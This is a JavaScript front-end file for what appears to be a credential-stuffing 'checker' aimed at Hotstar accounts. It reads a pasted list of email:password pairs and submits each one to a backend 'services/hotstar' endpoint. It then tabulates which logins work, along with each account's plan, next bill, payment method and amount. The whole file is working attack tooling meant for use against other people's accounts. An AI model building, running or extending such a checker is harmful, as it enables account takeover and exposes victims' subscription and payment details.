var splited;
$( document ).ready(function() {
    $("#submitForm").click(function(){
        var textArea = $("#accounts").val();
        splited = textArea.split("\n").map(e=>e.split(' ')[0]).filter(e=>validateEmail(e.split(':')[0]))
        promises(splited.map(e=>e.split(' ')[0]),0);
        console.log("splited",splited);

    });
});

function promises(arr,i){
    if(i === arr.length)
        return;
    $.post(
        {
            type:'POST',
            url:'services/hotstar',
            contentType: 'application/json',
            data: JSON.stringify({
                login:arr[i].split(":")[0],
                password:arr[i].split(":")[1]
            }),
            success: function(data) {
                promises(arr,i+1);
                console.log('post success');
                console.log(JSON.stringify(data));
                prependerModified(data);
            },
            error: function(data) {
                promises(arr,i+1);
                console.log('post error');
                console.log(JSON.stringify(data));
            }
        }
    )
    $('#progressBar').css('width',(i+1) / splited.length * 100 +"%");

}



function prependerModified(account) {
    var
        email = account.accountLogin.email,
        password = account.accountLogin.password,
        otp = 'X',
        plan = 'X',
        nextBill = 'X',
        paymentMethod = 'X',
        period = 'X',
        amount = 'X'
    ;
    if (account.validAccount && !account.otp) {
            plan = account.accountInfo.plan;
            nextBill = account.accountInfo.nextBill;
            paymentMethod = account.accountInfo.paymentMethod;
            period = account.accountInfo.period;
            amount = account.accountInfo.amount;
    }
    $('tbody').prepend('<tr>' +
        '      <th scope="row">' + account.validAccount + '</th>' +
        '      <td>' + account.otp + '</td>' +
        '      <td>' + email + '</td>' +
        '      <td>' + password + '</td>' +
        '      <td>' + plan + '</td>' +
        '      <td>' + nextBill + '</td>' +
        '      <td>' + paymentMethod + '</td>' +
        '      <td>' + period + '</td>' +
        '      <td>' + amount + '</td>' +
        '    </tr>')

}
function validateEmail(email) {
    const re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test(String(email).toLowerCase());
}
